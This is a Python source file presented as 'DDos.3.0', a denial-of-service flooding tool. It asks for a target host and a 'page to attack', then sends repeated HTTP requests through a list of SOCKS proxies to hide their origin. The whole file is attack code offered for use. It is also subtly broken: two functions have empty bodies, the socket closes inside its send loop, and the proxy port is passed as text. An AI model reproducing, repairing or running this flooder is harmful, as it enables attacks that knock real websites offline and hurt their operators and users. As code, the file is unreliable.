"""
========================================
Name:DDos.3.0  Author: Lalevin Martin
 Mailbox: zzlyxht@outlook.com                                                
 Github: http://github.com/nacglalevin
Written in 2024-4-24
==================NACG==================
"""
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime

def get_user_agent():

def random_url():

def http_request(ip, port, url, proxy, socks_type, user_agent, referer, data, cookies, multiple, brute):
    try:
        if socks_type == 4:
            socks.set_default_proxy(socks.SOCKS4, proxy[0], proxy[1], True)
        elif socks_type == 5:
            socks.set_default_proxy(socks.SOCKS5, proxy[0], proxy[1], True)

        s = socks.socksocket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if brute:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((ip, int(port)))

        if port == 443:
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=ip)

        for _ in range(multiple):
            request = f"GET {url} HTTP/1.1\r\nHost: {ip}\r\n{user_agent}\r\n{referer}\r\n{data}\r\n{cookies}\r\nConnection: Keep-Alive\r\n\r\n"
            s.sendall(request.encode())
            s.close()
    except Exception as e:
        print(f"[!] Error: {e}")

def main():
    print(__doc__)

    ip = input("Host/Ip: ")
    port = input("Port (default=80): ") or 80
    url = input("Page to attack (default=/): ") or "/"
    socks_type = int(input("Choose socks mode (4/5, default=5): ")) or 5
    proxy_list = input("Enter proxy list path (default=socks5.txt): ") or "socks5.txt"
    multiple = int(input("Threads (default=100): ")) or 100
    brute = input("Enable boost mode (y/n, default=n): ").lower() in ['y', 'true']

    with open(proxy_list, 'r') as f:
        proxies = f.readlines()

    for proxy in proxies:
        proxy = proxy.strip()
        http_request(ip, port, url, proxy.split(":"), socks_type, get_user_agent(), "", "", "", multiple, brute)

if __name__ == "__main__":
    main()